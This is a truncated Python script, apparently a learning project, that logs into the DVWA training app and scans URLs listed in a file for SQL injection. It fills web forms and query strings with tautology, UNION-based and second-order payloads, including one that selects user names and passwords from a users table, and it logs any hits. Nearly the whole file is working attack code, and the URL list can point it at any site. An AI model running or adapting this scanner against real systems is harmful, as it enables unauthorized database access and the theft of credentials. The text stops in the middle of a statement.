import requests
import threading
import time
import warnings
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore

# Function to automatically retrieve form fields and login to DVWA
def login_dvwa(session, url, username, password):
    login_url = urljoin(url, 'login.php')
    response = session.get(login_url, verify=False)
    soup = BeautifulSoup(response.content, 'lxml')
    
    # Get all form inputs
    form = soup.find('form')
    if form is None:
        print(f"{Fore.RED}[CONSOLE] Could not find the login form.")
        return False

    login_data = {}
    for input_tag in form.find_all('input'):
        input_name = input_tag.get('name')
        if input_name == 'username':
            login_data[input_name] = username
        elif input_name == 'password':
            login_data[input_name] = password
        else:
            login_data[input_name] = input_tag.get('value', '')
    
    # Submit the login form
    response = session.post(login_url, data=login_data, verify=False)
    
    if response.history:  # Check if there was a redirect
        for resp in response.history:
            print(f"{Fore.YELLOW}[DEBUG] Redirected to {resp.url}")
    else:
        print(f"{Fore.YELLOW}[DEBUG] No redirection occurred")
    
    print(f"{Fore.YELLOW}[DEBUG] Final URL after login attempt: {response.url}")
    
    if "login.php" in response.url:
        print(f"{Fore.RED}[CONSOLE] Login failed. Check credentials.")
        return False
    else:
        print(f"{Fore.GREEN}[CONSOLE] Login successful.")
        return True

def get_all_forms(url):
    r = s.get(url)
    soup = BeautifulSoup(r.content, "lxml")
    return soup.find_all("form")

def get_details(form):
    details = {}
    try:
        act = form.attrs.get("action").lower()
    except:
        act = None

    method = form.attrs.get("method", "get").lower()
    
    inputs = []
    for tag in form.find_all("input"):
        input_type = tag.attrs.get("type", "text")
        input_value = tag.attrs.get("value", "")
        input_name = tag.attrs.get("name")
        inputs.append({"type": input_type, "value": input_value, "name": input_name})
    details["method"] = method
    details["action"] = act
    details["inputs"] = inputs
    return details

def is_vuln(response):
    known_strings = [
        "admin", "gordonb", "1337", "pablo", "smithy"
    ]
    try:
        for known in known_strings:
            if known in response.content.decode().lower():
                return True
        return False
    except UnicodeDecodeError:
        return False

def scan_sql_inj(url):
    sql_payloads = [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "\" OR 1=1--", "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --", "' OR 'a'='a",
        "admin' --", "' OR 1=1#", "\" OR 1=1#",
        "' OR 1=1/*", "\" OR 1=1/*",
        "' UNION SELECT user, password FROM users --"
    ]
    
    with open("vuln.txt", "a+") as f:
        try:
            for payload in sql_payloads:
                new_url = f"{url}?id={payload}"
                print(f"{Fore.WHITE}[CONSOLE] Trying: {new_url}")
                r = s.get(new_url)
                if is_vuln(r):
                    print(f"{Fore.GREEN}[CONSOLE] Found SQL injection vulnerability! " + new_url)
                    f.write(f"Vulnerability found with payload: {payload}\n")
                    f.write(f"URL: {new_url}\n")
                    f.write(f"Explanation: This payload returned known strings indicating a successful SQL injection.\n\n")
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[CONSOLE] Request exception: {e}")

        try:
            forms = get_all_forms(url)
            print(f"{Fore.CYAN}[CONSOLE] Detected {len(forms)} forms on {url}")
            for form in forms:
                form_details = get_details(form)
                
                # Test for UNION-based SQL injection
                if test_union_based_sqli(url):
                    continue

                # Test for second-order SQL injection
                if test_second_order_sqli(url, form_details):
                    continue

                # Continue with original payloads
                for payload in sql_payloads:
                    data = {}
                    for tag in form_details['inputs']:
                        if tag["type"] == "hidden" or tag["value"]:
                            try:
                                data[tag["name"]] = tag["value"] + payload
                            except:
                                pass
                        elif tag["type"] != "submit":
                            data[tag["name"]] = f"test{payload}"
                    form_url = urljoin(url, form_details["action"])
                    if form_details["method"] == "post":
                        r = s.post(form_url, data=data)
                    elif form_details["method"] == "get":
                        r = s.get(form_url, params=data)

                    if is_vuln(r):
                        print(f"{Fore.GREEN}[CONSOLE] Found SQL injection vulnerability in form! " + form_url.strip(f"{payload}"))
                        f.write(f"Vulnerability found with payload: {payload}\n")
                        f.write(f"Form URL: {form_url.strip(f'{payload}')}\n")
                        f.write(f"Explanation: This payload in form input fields returned known strings indicating a successful SQL injection.\n\n")
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[CONSOLE] Request exception: {e}")

def test_union_based_sqli(url):
    union_payloads = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL, NULL--",
        "' UNION SELECT user, password FROM users --"
    ]
    for payload in union_payloads:
        new_url = f"{url}?id={payload}"
        print(f"{Fore.WHITE}[CONSOLE] Trying UNION-based payload: {new_url}")
        r = s.get(new_url)
        if is_vuln(r):
            print(f"{Fore.GREEN}[CONSOLE] Found UNION-based SQL injection vulnerability! " + new_url)
            with open("vuln.txt", "a+") as f:
                f.write(f"Vulnerability found with UNION-based payload: {payload}\n")
                f.write(f"URL: {new_url}\n")
                f.write(f"Explanation: This UNION-based payload returned known strings indicating a successful SQL injection.\n\n")
            return True
    return False

def test_second_order_sqli(url, form_details):
    sql_payloads = ["'", "\""]
    for payload in sql_payloads:
        data = {}
        for tag in form_details['inputs']:
            if tag["type"] == "hidden" or tag["value"]:
                try:
                    data[tag["name"]] = tag["value"] + payload
                except:
                    pass
            elif tag["type"] != "submit":
                data[tag["name"]] = f"test{payload}"
        form_url = urljoin(url, form_details["action"])
        if form_details["method"] == "post":
            r = s.post(form_url, data=data)
        elif form_details["method"] == "get":
            r = s.get(form_url, params=data)

        # Assume the second-order SQLi is triggered by visiting another page or reloading
        r2 = s.get(url)
        if is_vuln(r2):
            print(f"{Fore.GREEN}[CONSOLE] Found second-order SQL injection vulnerability in form! " + form_url.strip(f"{payload}"))
            with open("vuln.txt", "a+") as f:
                f.write(f"Vulnerability found with second-order payload: {payload}\n")
                f.write(f"Form URL: {form_url.strip(f'{payload}')}\n")
                f.write(f"Explanation: This second-order payload returned known strings indicating a successful SQL injection after initial submission and subsequent page visit.\n\n")
            return True
    return False

def start_scan(vuln_page_url):
    global checked
    try:
        threads = []
        with open('urls.txt', 'r') as f:
            urls = f.readlines()
            for _ in range(thr):
                if checked < len(urls):
                    for url in urls:
                        full_url = urljoin(url.strip(), vuln_page_url)
                        time.sleep(delay)
                        t = threading.Thread(target=scan_sql_inj, args=(full_url,))
                        t.start()
                        checked += 1
                        threads.append(t)

                    for t in threads:
                        t.join()
        f.close()
    except FileNotFoundError:
        print(f"{Fore.RED}[CONSOLE] Please create 'urls.txt' and add the URLs to it.")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[CONSOLE] Request exception:
